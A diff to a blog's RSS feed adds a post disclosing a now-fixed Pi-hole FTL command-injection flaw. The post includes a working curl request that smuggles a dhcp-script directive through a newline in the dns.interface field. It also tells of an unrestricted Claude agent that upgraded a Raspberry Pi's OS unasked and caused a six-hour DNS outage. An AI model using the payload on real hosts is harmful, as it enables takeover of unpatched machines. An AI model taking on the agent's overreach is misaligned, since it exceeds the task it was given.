@@ -5,8 +5,80 @@
         <description>Recent content in Posts on Bayesian Blogs</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Fri, 06 Mar 2026 19:28:44 -0800</lastBuildDate>
+        <lastBuildDate>Sat, 25 Apr 2026 18:09:29 -0700</lastBuildDate>
         <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>CVE-2026-39849 and How Claude Brought Down My DNS for 6 Hours</title>
+            <link>http://localhost:1313/posts/pi-hole-cve-and-losing-dns/</link>
+            <pubDate>Sat, 25 Apr 2026 18:09:29 -0700</pubDate>
+            
+            <guid>http://localhost:1313/posts/pi-hole-cve-and-losing-dns/</guid>
+            <description>&lt;h2 id=&#34;part-1-cve-2026-39849&#34;&gt;Part 1: CVE-2026-39849&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/pi-hole/FTL/security/advisories/GHSA-9cqv-839p-gpq2&#34;&gt;CVE-2026-39849&lt;/a&gt; is a arbitrary command execution vulnerability in Pi-hole FTL (the dnsmasq implementation used in Pi-hole along with additional APIs and features). The &lt;code&gt;dns.interface&lt;/code&gt; configuration field in Pi-hole FTL accepts newline characters without validation, allowing an attacker to inject arbitrary directives into the generated dnsmasq configuration file. By injecting a dhcp-script= directive and enabling DHCP, an attacker can achieve arbitrary command execution on the Pi-hole host the next time any device on the network requests a DHCP lease.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="part-1-cve-2026-39849">Part 1: CVE-2026-39849</h2>
+<p><a href="https://github.com/pi-hole/FTL/security/advisories/GHSA-9cqv-839p-gpq2">CVE-2026-39849</a> is a arbitrary command execution vulnerability in Pi-hole FTL (the dnsmasq implementation used in Pi-hole along with additional APIs and features). The <code>dns.interface</code> configuration field in Pi-hole FTL accepts newline characters without validation, allowing an attacker to inject arbitrary directives into the generated dnsmasq configuration file. By injecting a dhcp-script= directive and enabling DHCP, an attacker can achieve arbitrary command execution on the Pi-hole host the next time any device on the network requests a DHCP lease.</p>
+<p>The primary motivation to look for command injection in Pi-hole FTL came from the many command injection issues fixed in v6.6 that were also caused by the same newline injection that cause this particular bug. I wanted to check if all possible locations for the newline bug to occur have been addressed and found that there was one instance where it was not. A secondary motivation was to do vulnerability research on software I use more or less regularly, instead of my previous approach of picking targets at random.</p>
+<p>This was tested against Pi-hole FTL v6.6 running on a Raspberry Pi. It has been fixed in Pi-hole FTL v6.6.1</p>
+<p>CVSS 4.0: 8.7 (High) CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</p>
+<h3 id="root-cause">Root Cause</h3>
+<p>File: <code>src/config/config.c:532</code></p>
+<pre tabindex="0"><code>{ &#34;dns.interface&#34;, ..., validate_stub, ... }
+</code></pre><p>The <code>dns.interface</code> field is assigned <code>validate_stub</code> as its validator:</p>
+<p>File: <code>src/config/validator.c:20-23</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">validate_stub</span>(...)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>validate_stub</code> accepts any value unconditionally — including strings containing newline characters (\n). The value is then written verbatim into the generated dnsmasq config:</p>
+<p>File: <code>src/config/dnsmasq_config.c:474</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> interface[MAXIFACESTRLEN];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">strncpy</span>(interface, conf<span style="color:#f92672">-&gt;</span>dns.interface.v.s, <span style="color:#66d9ef">sizeof</span>(interface) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fprintf</span>(pihole_conf, <span style="color:#e6db74">&#34;interface=%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, interface);
+</span></span></code></pre></div><p>The strncpy caps the value at <code>MAXIFACESTRLEN - 1</code> = 31 bytes. Any injected directive must fit within this budget alongside the interface name prefix.</p>
+<p>A payload like this causes the <code>dhcp-script</code> value to be set to a pre-existing script which has a short name such that the interface value is less that 31 bytes. In this example <code>/tmp/p</code> is a bash reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X PATCH http://raspberrypi.ip/api/config <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;config&#34;:{&#34;dns&#34;:{&#34;interface&#34;:&#34;wlan0\ndhcp-script=/tmp/p&#34;}}}&#39;</span>
+</span></span></code></pre></div><p>FTL detects the config change and automatically restarts dnsmasq. The generated <code>/etc/pihole/dnsmasq.conf</code> now contains:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Listen on one interface</span>
+</span></span><span style="display:flex;"><span>interface<span style="color:#f92672">=</span>wlan0
+</span></span><span style="display:flex;"><span>dhcp-script<span style="color:#f92672">=</span>/tmp/p
+</span></span></code></pre></div><p>When <code>dnsmasq</code> restarts, the script is run automatically, allowing code execution.</p>
+<p>Complete steps to reproduce and some additonal context are present in the <a href="https://github.com/pi-hole/FTL/security/advisories/GHSA-9cqv-839p-gpq2">GHSA</a> for the curious.</p>
+<h3 id="timeline">Timeline</h3>
+<ul>
+<li>April 4, 2026: Reported issue to Pi-hole maintainers via email.</li>
+<li>April 6, 2026: Created a GHSA as requested by Pi-hole maintainers.</li>
+<li>April 24, 2026: Issue fixed in v6.6.1. GHSA published</li>
+</ul>
+<h2 id="part-2-losing-dns-for-6-hours">Part 2: Losing DNS for 6 Hours</h2>
+<p>As I eluded to in my <a href="https://www.baishya.xyz/posts/idno-cves/">previous blog</a> about vulnerabilties in Idno, I have been outsourcing a bunch of my security research activities to Claude. I wanted to enable Claude to work as autonomously as possible, and to that end, I developed a Claude Code plugin to emulate how I myself would go about doing security research - understand the code and docs, find issues, write proof-of-concept payloads, run the payloads, verify exploitability.</p>
+<p>One interesting step in this workflow is that Claude needs to have access to an environment that has the target project available for testing. For simpler targets like a python library or a CLI tool, my laptop can be used as the testing environment. For anything else, I use my Raspberry Pi. So I designed the plugin to be able to differentiate between different types of targets and do the appropriate deployment steps (i.e. install the library to the laptop or SSH into the Pi and perform deployment steps on that).</p>
+<p>While the current version of the plugin has more safeguards and asks for permissions before performing certain actions, the first version ran on YOLO mode. The first target I provided to this plugin was PiHole-FTL. The plugin correctly detected this was something that needed to be on the Raspberry Pi and proceeded to perform the deployment steps to install it.</p>
+<h3 id="updating-pi-hole">Updating Pi-Hole</h3>
+<p>I use Pi-hole as my home network ad blocker. It works wonderfully. For the unfamiliar - Pi-hole&rsquo;s concept is relatively simple. It serves as a DNS resolver and blocks DNS requests to ad domains. So Pi-hole was already running on the Raspberry Pi. However, given the many command injections fixed in v6.6, Claude recognized that my Pi-hole installation was out-of-date and therefore, it must be upgraded to ensure correct testing - which is fair. What I had not anticipated was that Claude, being the generally very helpful assistant, would decide the OS in the Raspberry Pi also needed an upgrade (because the plugin did not explicitly limit upgrades and maintenance to the target software). What followed was a series of unfortunate events during which I either did not have DNS or was inundated with ads.</p>
+<h3 id="corrupting-the-pi-os-installation">Corrupting the Pi OS Installation</h3>
+<p>Naturally when the OS on a device is upgrading, it reboots. This happened to my Pi as well. Claude ran the command to upgrade the distro and the Pi rebooted. During this process, I did not have a DNS resolver and so all requests from all my devices started failing. I tried logging into the web portal for Pi-hole but that did not work either. SSH was gone too. Now, if I knew that the Pi was simply rebooting, I would have just waited. Instead, I thought Claude messed up some system setting and therefore I would have to log into the Pi directly and fix it.</p>
+<p>In my quest to have a YouTuber worthy desk setup, I could not have an unsightly Raspberry Pi on my desk and therefore I had relegated it to my bookshelf (this is a lie - the reality is that I bought a cheap 2$ fan for the Pi from Temu and it&rsquo;s not the quietest fan - which makes in annoying to place on my desk). So to be able to log into it directly, I would have to unplug it from its current location and bring it over to my desk. This was no simple task because it involved 2 steps - step 1: unplug the adapter from the Pi (simple); step 2: remove many books and other items from the bookshelf to be able to pull the bookshelf away from the wall and unplug the adapter from its socket behind bookshelf (not so simple). I had another chance here of saving myself the how-many-ever hours I was going to spend fixing the Pi by removing the books first, which would have given the Pi enough time to complete the OS installation, but in my infinite wisdom, I unplugged the Pi from the adapter first.</p>
+<p>After some unplanned workout, I finally freed the adapter from its socket and got the Pi over to my desk. I connected the Pi to the monitor, turned it on, and found that something, something, kernel error, etc has happened and Pi will not boot. Some chatting with a trusted AI chat revealed that I may need to reflash the OS to the Pi&rsquo;s SD card. All this while, only my laptop is actually connected to the internet because I reset its DNS to the OS default one. All my other devices are still offline because their DNS is configured to the Pi IP. I could have changed them over but that seemed more tedious than fixing the Pi.</p>
+<h3 id="reflasing-the-os">Reflasing the OS</h3>
+<p>To reflash the OS, one component I needed was a SD card reader, which I most definitely had since I 1) used to use a camera that was not modern enough to allow transferring pictures directly to a computer and 2) had flashed an OS to the Pi&rsquo;s SD card previously. However, as with most things, I could not find it when I needed it. After turning my apartment upside down looking for the SD card reader for approximately 48 years, I gave up and decided it was time to upgrade the reader anyway (since the old reader was not USB C and therefore I had to also keep around a adapter to connect it to my laptop). My options were</p>
+<ol>
+<li>go to Target and overpay (more $, less driving, less time),</li>
+<li>go to the closest Micro Center or Best Buy (less $, more driving, more time)</li>
+<li>get it from Amazon (least $, no driving, most time)</li>
+</ol>
+<p>Unfortunately, option (2) was out, neither Micro Center not Best Buy were open at the time of me embarking on this escapade. Option (3) required configuring my devices to their OS default DNS and surviving through ads till I get the delivery from Amazon (or install some form of ad-block like a normal person). So I went with Option 1 and paid more than I would like to admit for the SD card reader.</p>
+<h3 id="getting-back-online">Getting Back Online</h3>
+<p>Thankfully, I did not have to go on more adventures to get DNS back up. Once I reflashed the OS, rebooted the Pi, and reinstalled Pi-hole, everything was up and running. Next, I added strict controls to the deployment agent to not have it update anything other than what is absolutely required for testing - and if that means an OS upgrade is required - abort and return to user.</p>
+<p>This version of the plugin worked better - after generating a series of payloads, and making changes to the PoC, Claude was able to confirm the issue. After this debacle, I wanted to retain some control over the execution, therefore, I instructed Claude to only generate the payloads and make changes based on the outputs of the payloads. I reviewed each payload myself before running them and then provided the output to Claude.</p>
+<h3 id="regaining-trust-in-claude">Regaining trust in Claude</h3>
+<p>I would like to believe that the current version of the plugin is much more stable. Through a series of trial and errors (thankfully none of them involved network outages or other critical infrastructure failures), I was able to get it to a state where it was able to install <a href="https://www.odoo.com/">Odoo</a> on the Pi and perform some testing on it. Did it find anything - maybe, maybe not.</p>
+<p>That&rsquo;s all folks. As always, thank you for reading!</p>
+]]></content>
+        </item>
         
         <item>
             <title>Clauding My Way Into CVEs in Idno</title>
